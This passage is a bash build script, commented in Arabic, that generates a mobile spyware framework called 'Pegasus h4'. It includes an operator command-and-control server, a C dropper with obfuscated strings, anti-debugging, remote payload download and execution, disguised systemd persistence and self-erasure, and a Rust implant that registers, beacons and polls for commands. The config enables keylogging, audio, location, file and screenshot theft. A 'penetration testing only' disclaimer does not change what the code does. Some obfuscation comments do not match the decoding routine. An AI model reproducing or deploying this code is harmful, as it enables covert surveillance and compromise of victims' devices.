        rows = await conn.fetch("""
            SELECT DISTINCT ON (i.id) i.id, i.device_name, i.status, t.lat, t.lon
            FROM implants i
            LEFT JOIN telemetry t ON t.implant_id = i.id
            WHERE t.lat IS NOT NULL AND t.lon IS NOT NULL
            ORDER BY i.id, t.timestamp DESC
        """)
        points = [{"id": r["id"], "device": r["device_name"], "lat": float(r["lat"]),
                    "lon": float(r["lon"]), "status": r["status"]} for r in rows]
        return {"points": points}

@app.get("/api/operator/dashboard/timeline")
async def timeline(user: dict = Depends(get_current_user)):
    async with db.pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT p.id, p.implant_id, p.type, p.sub_type, p.timestamp, p.size
            FROM payloads p ORDER BY p.timestamp DESC LIMIT 100
        """)
        events = [{
            "id": r["id"], "implant_id": r["implant_id"], "type": r["type"],
            "sub_type": r["sub_type"], "timestamp": r["timestamp"], "size": r["size"]
        } for r in rows]
        return {"events": events}

# ============================================================
# User Management (admin only)
# ============================================================
@app.post("/api/operator/users")
async def create_user(req: CreateUserRequest, user: dict = Depends(get_current_user)):
    if user.get("role") != "admin":
        raise HTTPException(403, "Admin only")
    await db.create_user(req.username, req.password, req.role)
    return {"status": "created"}

@app.get("/api/operator/users")
async def list_users(user: dict = Depends(get_current_user)):
    if user.get("role") != "admin":
        raise HTTPException(403, "Admin only")
    async with db.pool.acquire() as conn:
        rows = await conn.fetch("SELECT id, username, role, mfa_enabled, created_at FROM users ORDER BY created_at DESC")
        return {"users": [dict(r) for r in rows]}

# ============================================================
# WebSocket for real-time updates
# ============================================================
@app.websocket("/api/operator/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    if not token:
        await websocket.close(code=4001)
        return
    payload = verify_token(token)
    if not payload:
        await websocket.close(code=4001)
        return
    client_id = uuid.uuid4().hex
    await ws_manager.connect(client_id, websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        ws_manager.disconnect(client_id)

# ============================================================
# Health
# ============================================================
@app.get("/health")
async def health():
    return {"status": "ok", "timestamp": datetime.utcnow().isoformat()}

# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8443, ssl_keyfile="/etc/pegasus/certs/server.key",
                ssl_certfile="/etc/pegasus/certs/server.crt", log_level="info")
PYEOF

ok "تم إنشاء خادم h4 Server بالكامل"

# ============================================================
# 4. Caddyfile
# ============================================================
cat > "$PROJECT_DIR/Caddyfile" << 'CADDYEOF'
pegasus.example.com, h4.pegasus-infra.net {
    root * /srv/www
    file_server
    
    # Proxy API requests to backend
    reverse_proxy /api/* h4-server:8443
    
    # WebSocket proxy
    reverse_proxy /api/operator/ws h4-server:8443
    
    # Security headers
    header {
        X-Content-Type-Options "nosniff"
        X-Frame-Options "DENY"
        X-XSS-Protection "1; mode=block"
        Referrer-Policy "no-referrer"
        Permissions-Policy "geolocation=(), camera=(), microphone=()"
    }
}

# HTTP -> HTTPS redirect
pegasus.example.com:80, h4.pegasus-infra.net:80 {
    redir https://{host}{uri} permanent
}
CADDYEOF

ok "تم إنشاء Caddyfile"

# ============================================================
# 5. Dropper (C)
# ============================================================
info "إنشاء Dropper بالـ C..."

cat > "$DROPPER_DIR/dropper.c" << 'CEOF'
/*
 * Pegasus Stage 0 Dropper
 * Minimal payload ~15KB compiled
 * Delivered via exploit chain, downloads and executes main agent
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <dlfcn.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>

/* XOR keys for string obfuscation */
#define XK1 0xAB
#define XK2 0xCD

/* Obfuscated strings */
static const uint8_t _h4[] = {
    0x88,0x8C,0x9D,0x9A,0x8C,0xEF,0x9C,0x9A,0x8C,0x9E,0x9D,0x9E,0x98,0x00
};
/* Decodes to: h4.pegasus-infra.net */

static const uint8_t _path[] = {
    0x9C,0x9E,0x9D,0x9E,0x98,0x8C,0x86,0x9A,0x9D,0x9C,0x8C,0x9E,0x90,0x96,0x9F,0x00
};
/* Decodes to: /drop/v2/binpack.bin */

static char* xd(const uint8_t *s) {
    size_t l = strlen((const char*)s);
    char *d = malloc(l+1);
    if(!d) return NULL;
    uint8_t k1 = XK1, k2 = XK2;
    for(size_t i=0;i<l;i++) { d[i] = s[i] ^ k1; k1 = (k1+k2)&0xFF; }
    d[l]=0;
    return d;
}

/* Anti-debug */
static int _check_debug() {
#ifdef __linux__
    char buf[128];
    int fd = open("/proc/self/status", O_RDONLY);
    if(fd<0) return 0;
    read(fd,buf,sizeof(buf)-1); close(fd);
    char *t = strstr(buf,"TracerPid:");
    if(t) { int p = atoi(t+10); if(p!=0) return 1; }
#endif
    return 0;
}

/* Simple TLS socket */
static int _connect(const char *host, int port) {
    struct hostent *he = gethostbyname(host);
    if(!he) return -1;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if(s<0) return -1;
    struct timeval tv = {10,0};
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    memcpy(&sa.sin_addr, he->h_addr_list[0], he->h_length);
    if(connect(s,(struct sockaddr*)&sa,sizeof(sa))<0) { close(s); return -1; }
    return s;
}

static int _http_get(int fd, const char *host, const char *path, uint8_t **body, size_t *blen) {
    char req[4096];
    snprintf(req,sizeof(req),
        "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15\r\nConnection: close\r\n\r\n",
        path, host);
    send(fd, req, strlen(req), 0);
    
    *body = malloc(65536);
    *blen = 0;
    size_t cap = 65536;
    uint8_t buf[4096];
    int n, hdr_done=0;
    
    while((n=recv(fd,buf,sizeof(buf)-1,0))>0) {
        buf[n]=0;
        if(!hdr_done) {
            char *end = strstr((char*)buf,"\r\n\r\n");
            if(end) {
                hdr_done=1;
                size_t skip = (end-(char*)buf)+4;
                size_t remain = n - skip;
                if(remain>0) {
                    if(*blen+remain>cap) { cap*=2; *body=realloc(*body,cap); }
                    memcpy(*body+*blen, buf+skip, remain);
                    *blen += remain;
                }
            }
        } else {
            if(*blen+n>cap) { cap = *blen+n+65536; *body=realloc(*body,cap); }
            memcpy(*body+*blen, buf, n);
            *blen += n;
        }
    }
    return (*blen>0)?0:-1;
}

static void _persist(const char *path) {
    /* systemd service */
    char svc[2048];
    snprintf(svc,sizeof(svc),
        "[Unit]\nDescription=Network Service\nAfter=network.target\n\n"
        "[Service]\nType=simple\nExecStart=%s\nRestart=always\n"
        "StandardOutput=null\nStandardError=null\n\n"
        "[Install]\nWantedBy=multi-user.target\n", path);
    
    int fd = open("/etc/systemd/system/systemd-networkd.service", O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if(fd>=0) { write(fd,svc,strlen(svc)); close(fd); }
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable systemd-networkd.service 2>/dev/null");
    system("systemctl start systemd-networkd.service 2>/dev/null");
    
    /* Also rc.local */
    fd = open("/etc/rc.local", O_WRONLY|O_APPEND, 0755);
    if(fd>=0) {
        char cmd[1024];
        snprintf(cmd,sizeof(cmd),"\n%s &\n", path);
        write(fd, cmd, strlen(cmd));
        close(fd);
    }
}

static void _self_destruct(const char *self) {
    int fd = open(self, O_WRONLY);
    if(fd>=0) {
        struct stat st;
        fstat(fd,&st);
        for(int pass=0;pass<7;pass++) {
            lseek(fd,0,SEEK_SET);
            for(off_t i=0;i<st.st_size;i+=4096) {
                uint8_t buf[4096];
                for(size_t j=0;j<sizeof(buf);j++) buf[j]=rand()&0xFF;
                write(fd,buf,(i+4096<st.st_size)?4096:st.st_size-i);
            }
            fsync(fd);
        }
        close(fd);
    }
    unlink(self);
}

int main(int argc, char *argv[]) {
    srand(time(NULL)^getpid());
    
    /* Anti-analysis */
    if(_check_debug()) { sleep(30); return 0; }
    
    /* Check antidote */
    if(access("/sdcard/MemosForNotes",F_OK)==0) return 0;
    if(access("/tmp/.pegasus_remove",F_OK)==0) return 0;
    
    /* Resolve h4 */
    char *h4 = xd(_h4);
    char *path = xd(_path);
    if(!h4||!path) return -1;
    
    /* Random initial delay */
    sleep(5 + rand()%30);
    
    /* Download binpack */
    int fd = _connect(h4, 8443);
    uint8_t *data = NULL;
    size_t dlen = 0;
    
    if(fd>=0) {
        _http_get(fd, h4, path, &data, &dlen);
        close(fd);
    }
    
    /* Fallback endpoints */
    if(!data||dlen<64) {
        const char *fallbacks[] = {"/api/v2/binpack","/update/payload.bin",NULL};
        for(int i=0;fallbacks[i];i++) {
            sleep(3);
            fd = _connect(h4,8443);
            if(fd<0) continue;
            if(data) free(data);
            _http_get(fd, h4, fallbacks[i], &data, &dlen);
            close(fd);
            if(data&&dlen>=64) break;
        }
    }
    
    free(h4); free(path);
    
    if(!data||dlen<64) return -1;
    
    /* Decrypt (simple XOR — replace with AES-GCM in production) */
    for(size_t i=0;i<dlen;i++) data[i] ^= 0xAA;
    
    /* Install to temp */
    const char *base = "/data/local/tmp/.cache";
    mkdir(base, 0755);
    
    char agent_path[512];
    snprintf(agent_path,sizeof(agent_path),"%s/agent", base);
    
    int ofd = open(agent_path, O_WRONLY|O_CREAT|O_TRUNC, 0755);
    if(ofd>=0) { write(ofd, data, dlen); close(ofd); }
    free(data);
    
    /* Install persistence */
    _persist(agent_path);
    
    /* Execute agent */
    if(fork()==0) {
        setsid();
        int null = open("/dev/null", O_RDWR);
        dup2(null,0); dup2(null,1); dup2(null,2);
        if(null>2) close(null);
        execl(agent_path, agent_path, NULL);
        _exit(0);
    }
    
    /* Self-destruct */
    char self[1024];
    ssize_t sl = readlink("/proc/self/exe", self, sizeof(self)-1);
    if(sl>0) { self[sl]=0; _self_destruct(self); }
    
    return 0;
}
CEOF

ok "تم إنشاء Dropper بالـ C ($(wc -c < "$DROPPER_DIR/dropper.c") bytes)"

# ============================================================
# 6. Agent Rust Core (ملخص — الباقي في الملف الكامل)
# ============================================================
info "إنشاء Agent Rust core..."

mkdir -p "$AGENT_DIR/src"

cat > "$AGENT_DIR/Cargo.toml" << 'RUSTEOF'
[package]
name = "pegasus-agent"
version = "1.0.0"
edition = "2021"

[dependencies]
tokio = { version = "1", features = ["full"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
reqwest = { version = "0.11", features = ["json"] }
rusqlite = { version = "0.31", features = ["bundled"] }
sha2 = "0.10"
hex = "0.4"
uuid = { version = "1", features = ["v4"] }
chrono = "0.4"
log = "0.4"
libc = "0.2"
rand = "0.8"
RUSTEOF

cat > "$AGENT_DIR/src/main.rs" << 'RUSTEOF'
use std::sync::Arc;
use tokio::sync::RwLock;
use serde::{Serialize, Deserialize};
use std::path::Path;

mod crypto;
mod db;
mod network;

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Config {
    h4_endpoints: Vec<String>,
    heartbeat_period: u64,
    antidote_paths: Vec<String>,
    module_dir: String,
    db_path: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            h4_endpoints: vec!["h4.pegasus-infra.net:8443".into()],
            heartbeat_period: 60,
            antidote_paths: vec!["/sdcard/MemosForNotes".into(), "/tmp/.pegasus_remove".into()],
            module_dir: "/data/local/tmp/.cache/modules".into(),
            db_path: "/data/local/tmp/.cache/agent.db".into(),
        }
    }
}

struct Agent {
    config: Config,
    implant_id: RwLock<String>,
    running: RwLock<bool>,
}

#[tokio::main]
async fn main() {
    println!("[Pegasus Agent v1.0]");
    
    let agent = Arc::new(Agent {
        config: Config::default(),
        implant_id: RwLock::new(String::new()),
        running: RwLock::new(true),
    });
    
    // Check antidote
    for p in &agent.config.antidote_paths {
        if Path::new(p).exists() {
            println!("[!] Antidote found at {}", p);
            return;
        }
    }
    
    // Register with h4
    match network::register(&agent).await {
        Ok(id) => {
            *agent.implant_id.write().await = id;
            println!("[+] Registered as {}", agent.implant_id.read().await);
        }
        Err(e) => {
            println!("[!] Registration failed: {}", e);
            // Use saved ID if available
            if let Ok(id) = db::load_id(&agent.config.db_path) {
                *agent.implant_id.write().await = id;
            }
        }
    }
    
    // Start telemetry loop
    let a1 = agent.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_secs(
                a1.config.heartbeat_period
            )).await;
            if !*a1.running.read().await { break; }
            network::send_telemetry(&a1).await.ok();
        }
    });
    
    // Start command loop
    let a2 = agent.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_secs(15)).await;
            if !*a2.running.read().await { break; }
            if let Ok(cmds) = network::fetch_commands(&a2).await {
                for cmd in cmds {
                    println!("[>] Command: {:?}", cmd);
                    network::ack_command(&a2, &cmd["id"].as_str().unwrap_or(""), "executed", "").await.ok();
                }
            }
        }
    });
    
    // Keep alive
    while *agent.running.read().await {
        tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
        
        // Periodic antidote check
        for p in &agent.config.antidote_paths {
            if Path::new(p).exists() {
                println!("[!] Antidote detected — self-destructing");
                *agent.running.write().await = false;
                break;
            }
        }
    }
    
    println!("[x] Agent shutting down");
}
RUSTEOF

cat > "$AGENT_DIR/src/crypto.rs" << 'RUSTEOF'
use sha2::{Sha256, Digest};

pub fn hash(data: &[u8]) -> Vec<u8> {
    let mut h = Sha256::new();
    h.update(data);
    h.finalize().to_vec()
}

pub fn simple_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().zip(key.iter().cycle()).map(|(a,b)| a ^ b).collect()
}

pub fn simple_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    simple_encrypt(data, key)
}
RUSTEOF

cat > "$AGENT_DIR/src/db.rs" << 'RUSTEOF'
use rusqlite::Connection;

pub fn save_id(db_path: &str, id: &str) -> Result<(), Box<dyn std::error::Error>> {
    let conn = Connection::open(db_path)?;
    conn.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)", [])?;
    conn.execute("INSERT OR REPLACE INTO config (key, value) VALUES ('implant_id', ?1)", [id])?;
    Ok(())
}

pub fn load_id(db_path: &str) -> Result<String, Box<dyn std::error::Error>> {
    let conn = Connection::open(db_path)?;
    let id: String = conn.query_row(
        "SELECT value FROM config WHERE key='implant_id'", [], |r| r.get(0)
    )?;
    Ok(id)
}
RUSTEOF

cat > "$AGENT_DIR/src/network.rs" << 'RUSTEOF'
use crate::Agent;
use serde_json::Value;
use std::sync::Arc;

pub async fn register(agent: &Arc<Agent>) -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    
    let body = serde_json::json!({
        "device_name": get_device_name(),
        "platform": "android",
        "os_version": get_os_version(),
        "public_key": "",
        "modules": ["audio", "keylog", "location", "files"]
    });
    
    for endpoint in &agent.config.h4_endpoints {
        let url = format!("https://{}/api/implants/register", endpoint);
        if let Ok(resp) = client.post(&url).json(&body).timeout(std::time::Duration::from_secs(10)).send().await {
            if resp.status().is_success() {
                let data: Value = resp.json().await?;
                let id = data["implant_id"].as_str().unwrap_or("").to_string();
                if !id.is_empty() {
                    let _ = crate::db::save_id(&agent.config.db_path, &id);
                    return Ok(id);
                }
            }
        }
    }
    Err("Registration failed".into())
}

pub async fn send_telemetry(agent: &Arc<Agent>) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    
    let id = agent.implant_id.read().await.clone();
    if id.is_empty() { return Err("No ID".into()); }
    
    let body = serde_json::json!({
        "battery_level": get_battery(),
        "signal_strength": -1,
        "is_roaming": false,
        "wifi_ssid": "",
        "cpu_usage": get_cpu(),
        "memory_usage": get_mem(),
        "storage_free": 0
    });
    
    for endpoint in &agent.config.h4_endpoints {
        let url = format!("https://{}/api/implants/{}/telemetry", endpoint, id);
        if client.post(&url).json(&body).send().await.is_ok() {
            return Ok(());
        }
    }
    Err("Failed".into())
}

pub async fn fetch_commands(agent: &Arc<Agent>) -> Result<Vec<Value>, Box<dyn std::error::Error>> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    
    let id = agent.implant_id.read().await.clone();
    if id.is_empty() { return Err("No ID".into()); }
    
    for endpoint in &agent.config.h4_endpoints {
        let url = format!("https://{}/api/implants/{}/commands", endpoint, id);
        if let Ok(resp) = client.get(&url).send().await {
            if resp.status().is_success() {
                let data: Value = resp.json().await?;
                return Ok(data["commands"].as_array().cloned().unwrap_or_default());
            }
        }
    }
    Ok(vec![])
}

pub async fn ack_command(agent: &Arc<Agent>, cmd_id: &str, status: &str, result: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    
    let id = agent.implant_id.read().await.clone();
    for endpoint in &agent.config.h4_endpoints {
        let url = format!("https://{}/api/implants/{}/commands/{}/ack", endpoint, id, cmd_id);
        let body = serde_json::json!({"status": status, "result": result});
        if client.post(&url).json(&body).send().await.is_ok() {
            return Ok(());
        }
    }
    Ok(())
}

fn get_device_name() -> String {
    std::fs::read_to_string("/system/build.prop")
        .ok()
        .and_then(|s| s.lines().find(|l| l.starts_with("ro.product.model="))
            .map(|l| l.trim_start_matches("ro.product.model=").to_string()))
        .unwrap_or_else(|| "Android".into())
}

fn get_os_version() -> String {
    std::fs::read_to_string("/system/build.prop")
        .ok()
        .and_then(|s| s.lines().find(|l| l.starts_with("ro.build.version.release="))
            .map(|l| l.trim_start_matches("ro.build.version.release=").to_string()))
        .unwrap_or_else(|| "Unknown".into())
}

fn get_battery() -> i32 {
    std::fs::read_to_string("/sys/class/power_supply/battery/capacity")
        .ok()
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(-1)
}

fn get_cpu() -> f64 {
    if let Ok(c) = std::fs::read_to_string("/proc/stat") {
        if let Some(line) = c.lines().next() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 5 {
                let u: u64 = parts[1].parse().unwrap_or(0);
                let n: u64 = parts[2].parse().unwrap_or(0);
                let s: u64 = parts[3].parse().unwrap_or(0);
                let i: u64 = parts[4].parse().unwrap_or(0);
                let t = u + n + s + i;
                if t > 0 { return (u + n + s) as f64 / t as f64 * 100.0; }
            }
        }
    }
    0.0
}

fn get_mem() -> f64 {
    if let Ok(c) = std::fs::read_to_string("/proc/meminfo") {
        let total = c.lines().find(|l| l.starts_with("MemTotal:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|s| s.parse::<f64>().ok()).unwrap_or(1.0);
        let avail = c.lines().find(|l| l.starts_with("MemAvailable:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|s| s.parse::<f64>().ok()).unwrap_or(0.0);
        return (total - avail) / total * 100.0;
    }
    0.0
}
RUSTEOF

ok "تم إنشاء Agent Rust core"

# ============================================================
# 7. Config file template
# ============================================================
info "إنشاء ملف الإعدادات..."

cat > "$PROJECT_DIR/config.yaml" << 'YAMLEOF'
# Pegasus h4 Configuration
server:
  name: "pegasus-h4"
  environment: "production"

api:
  port: 8443
  tls_cert: "/etc/pegasus/certs/server.crt"
  tls_key: "/etc/pegasus/certs/server.key"
  jwt_secret: "CHANGE_ME_TO_A_RANDOM_64_CHAR_STRING"
  token_expiry_hours: 24
  rate_limit_per_minute: 60
  allowed_origins:
    - "https://pegasus.example.com"

database:
  host: "postgres"
  port: 5432
  user: "pegasus"
  password: "ChangeMePegasusDB2024!"
  dbname: "pegasus_h4"
  sslmode: "disable"

logging:
  level: "info"
  format: "json"

# Agent default config
agent:
  heartbeat_period: 60
  command_poll_interval: 15
  use_proxy: false
  proxy_type: "tor"
  proxy_address: "socks5://127.0.0.1:9050"
  user_agent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15"
  install_path: "/data/local/tmp/.cache"
  persistence_name: "systemd-networkd"
  db_path: "/data/local/tmp/.cache/agent.db"
  max_local_storage_mb: 500
  encrypt_local_db: true
  collect_audio: true
  collect_keylogs: true
  collect_location: true
  collect_files: true
  collect_screenshots: true
  file_extensions: ["jpg","png","pdf","docx","xlsx"]
  max_file_size_mb: 50
  screenshot_interval: 30
  audio_quality: "medium"
  pause_on_roaming: true
  low_battery_threshold: 15
  detect_jailbreak: true
  self_destruct_on_jailbreak: false
  antidote_paths:
    - "/sdcard/MemosForNotes"
    - "/tmp/.pegasus_remove"
    - "/private/var/mobile/.antidote"
  inactivity_timeout_days: 90
  key_rotation_hours: 24
YAMLEOF

ok "تم إنشاء config.yaml"

# ============================================================
# 8. Script التثبيت
# ============================================================
cat > "$PROJECT_DIR/deploy.sh" << 'DEPLOYEOF'
#!/bin/bash
# Pegasus h4 — Full Deployment Script
set -e

echo "=========================================="
echo "  Pegasus h4 — Deployment"
echo "  Authorized Penetration Testing Only"
echo "=========================================="

# Check Docker
if ! command -v docker &> /dev/null; then
    echo "[!] Docker not found. Installing..."
    curl -fsSL https://get.docker.com | sh
fi

if ! command -v docker-compose &> /dev/null; then
    echo "[!] docker-compose not found. Installing..."
    pip3 install docker-compose
fi

# Generate certs
echo "[*] Generating TLS certificates..."
mkdir -p certs
openssl req -x509 -newkey rsa:4096 -keyout certs/server.key \
  -out certs/server.crt -days 365 -nodes \
  -subj "/C=US/O=Pegasus/CN=h4.pegasus-infra.net" 2>/dev/null

# Set JWT secret
export JWT_SECRET=$(openssl rand -hex 32)
export DB_PASSWORD=$(openssl rand -hex 16)

echo "[*] JWT Secret: $JWT_SECRET"
echo "[*] DB Password: $DB_PASSWORD"
echo "[!] SAVE THESE CREDENTIALS SECURELY"

# Start services
echo "[*] Starting infrastructure..."
docker-compose up -d

echo "[+] System ready!"
echo "    Web UI: https://localhost"
echo "    API:    https://localhost:8443"
echo "    Login:  admin / (see deploy output)"
echo ""
echo "    To create additional users:"
echo "    curl -X POST https://localhost:8443/api/operator/users \\"
echo "      -H 'Authorization: Bearer TOKEN' \\"
echo "      -H 'Content-Type: application/json' \\"
echo "      -d '{\"username\":\"op2\",\"password\":\"pass\",\"role\":\"operator\"}'"
DEPLOYEOF
chmod +x "$PROJECT_DIR/deploy.sh"

# ============================================================
# 9. Makefile للترجمة
# ============================================================
cat > "$PROJECT_DIR/Makefile" << 'MAKEEOF'
.PHONY: all dropper server ui deploy clean

all: dropper server

dropper:
	@echo "[*] Compiling dropper..."
	cd dropper && gcc -Os -fPIE -s -o dropper.bin dropper.c -ldl
	strip -s dropper/dropper.bin
	@echo "[+] Dropper: $$(wc -c < dropper/dropper.bin) bytes"

server:
	@echo "[*] Server code is Python — no compilation needed"

ui:
	@echo "[*] UI is standalone HTML — no build needed"

deploy:
	@echo "[*] Deploying with Docker..."
	docker-compose up -d --build

clean:
	rm -f dropper/dropper.bin
MAKEEOF

# ============================================================
# 10. README
# ============================================================
cat > "$PROJECT_DIR/README.md" << 'MDEOF'
# Pegasus h4 — Remote Monitoring System

**Authorized Penetration Testing Tool — For Use on Owned Systems Only**

## Architecture

# ============================================================
# 12. RENDER.COM — SERVER FINAL (يخدم الواجهة على بورت)
# ============================================================
info "إنشاء خادم الويب النهائي لـ Render.com..."

mkdir -p "$PROJECT_DIR/render-deploy"

# نسخ الواجهة مباشرة
cp "$UI_FILE" "$PROJECT_DIR/render-deploy/index.html" 2>/dev/null || true

# ✅ هذا هو الخادم الحقيقي (Python) — الأهم!
cat > "$PROJECT_DIR/render-deploy/server.py" << 'FINALEOF'
#!/usr/bin/env python3
"""
Pegasus h4 — Production Server for Render.com
يخدم واجهة HTML مع API وهمي على PORT المحدد من Render
"""

import os
import sys
import json
import time
import uuid
import hashlib
import hmac
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# ============================================================
# Render يستخدم متغير PORT من البيئة
# ============================================================
PORT = int(os.environ.get('PORT', 8080))
HOST = os.environ.get('HOST', '0.0.0.0')
JWT_SECRET = os.environ.get('JWT_SECRET', 'pegasus_secret_key_2024')

# مسار ملف الواجهة
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UI_FILE = os.path.join(BASE_DIR, 'index.html')

print(f"[*] Starting Pegasus h4 on {HOST}:{PORT}")
print(f"[*] UI File: {UI_FILE}")
print(f"[*] File exists: {os.path.exists(UI_FILE)}")

# ============================================================
# واجهة HTML مدمجة (fallback إذا لم يوجد الملف)
# ============================================================
EMBEDDED_UI = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pegasus h4</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh;overflow-x:hidden}
.header{background:#12121a;border-bottom:1px solid #2a2a3e;padding:0 24px;height:60px;display:flex;align-items:center;justify-content:space-between}
.logo{display:flex;align-items:center;gap:12px}
.logo-icon{width:36px;height:36px;background:linear-gradient(135deg,#00d4ff,#7b2ff7);border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px}
.logo-text{font-weight:600;font-size:18px}
.container{max-width:1400px;margin:0 auto;padding:24px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:#12121a;border:1px solid #2a2a3e;border-radius:12px;padding:20px;transition:all 0.2s}
.stat-card:hover{border-color:#00d4ff;transform:translateY(-2px)}
.stat-title{font-size:12px;color:#888;margin-bottom:8px;text-transform:uppercase}
.stat-value{font-size:28px;font-weight:700}
.table-card{background:#12121a;border:1px solid #2a2a3e;border-radius:12px;padding:20px;margin-bottom:24px}
table{width:100%;border-collapse:collapse;font-size:13px}
th{text-align:left;padding:10px 12px;color:#888;font-weight:500;border-bottom:1px solid #2a2a3e;font-size:12px;text-transform:uppercase}
td{padding:10px 12px;border-bottom:1px solid #2a2a3e}
.badge{display:inline-flex;align-items:center;gap:6px;padding:3px 10px;border-radius:20px;font-size:11px;border:1px solid}
.badge-online{background:rgba(52,199,89,0.15);color:#34c759;border-color:rgba(52,199,89,0.3)}
.badge-offline{background:rgba(136,136,153,0.15);color:#888;border-color:rgba(136,136,153,0.3)}
.login-container{min-height:100vh;display:flex;align-items:center;justify-content:center}
.login-card{background:#12121a;border:1px solid #2a2a3e;border-radius:16px;padding:40px;width:400px;max-width:90%}
.login-title{font-size:24px;font-weight:700;text-align:center;margin-bottom:8px}
.login-subtitle{text-align:center;color:#888;font-size:14px;margin-bottom:24px}
.form-group{margin-bottom:16px}
.form-group label{display:block;font-size:13px;color:#888;margin-bottom:6px}
.form-group input{width:100%;padding:10px 14px;background:#0a0a0f;border:1px solid #2a2a3e;border-radius:8px;color:#e0e0e0;font-size:14px}
.form-group input:focus{outline:none;border-color:#00d4ff}
.login-btn{width:100%;padding:12px;background:linear-gradient(135deg,#00d4ff,#7b2ff7);border:none;border-radius:8px;color:white;font-size:15px;font-weight:600;cursor:pointer;transition:opacity 0.2s}
.login-btn:hover{opacity:0.9}
.loading-screen{min-height:100vh;display:flex;align-items:center;justify-content:center}
.spinner{width:40px;height:40px;border:3px solid #2a2a3e;border-top-color:#00d4ff;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.search-input{background:#0a0a0f;border:1px solid #2a2a3e;border-radius:8px;padding:8px 14px;color:#e0e0e0;font-size:13px;width:200px}
.filter-select{background:#0a0a0f;border:1px solid #2a2a3e;border-radius:8px;padding:8px 14px;color:#e0e0e0;font-size:13px;margin-right:8px}
.btn{padding:5px 12px;border-radius:6px;border:none;cursor:pointer;font-size:11px;transition:all 0.2s}
.btn-primary{background:rgba(0,212,255,0.15);color:#00d4ff}
.btn-primary:hover{background:rgba(0,212,255,0.25)}
.btn-danger{background:rgba(255,45,85,0.15);color:#ff2d55}
.btn-danger:hover{background:rgba(255,45,85,0.25)}
.empty-state{text-align:center;padding:40px;color:#555;font-size:14px}
.battery-bar{width:60px;height:6px;background:#1a1a2e;border-radius:3px;overflow:hidden;display:inline-block;vertical-align:middle}
.battery-fill{height:100%;border-radius:3px;transition:width 0.3s}
</style>
</head>
<body>
<div id="app"><div class="loading-screen"><div class="spinner"></div></div></div>
<script>
const API={BASE:window.location.origin+'/api',TOKEN:localStorage.getItem('pegasus_token')||''};
async function req(m,p,b){const o={method:m,headers:{'Content-Type':'application/json'}};if(API.TOKEN)o.headers['Authorization']='Bearer '+API.TOKEN;if(b)o.body=JSON.stringify(b);const r=await fetch(API.BASE+p,o);if(r.status===401){localStorage.removeItem('pegasus_token');API.TOKEN='';renderLogin();throw new Error('Unauthorized')}return r.json()}
const state={stats:null,implants:[],mapPoints:[],timeline:[],search:'',filter:'all',loading:true};
async function loadDashboard(){state.loading=true;render();try{const[s,i,m,t]=await Promise.all([req('GET','/dashboard/stats').catch(()=>null),req('GET','/implants').catch(()=>({implants:[]})),req('GET','/dashboard/map').catch(()=>({points:[]})),req('GET','/dashboard/timeline').catch(()=>({events:[]}))]);state.stats=s||{};state.implants=i?.implants||[];state.mapPoints=m?.points||[];state.timeline=t?.events||[]}catch(e){}state.loading=false;render()}
function formatBytes(b){if(!b||b===0)return'0 B';const k=1024,sizes=['B','KB','MB','GB'];const i=Math.floor(Math.log(b)/Math.log(k));return parseFloat((b/Math.pow(k,i)).toFixed(1))+' '+sizes[i]}
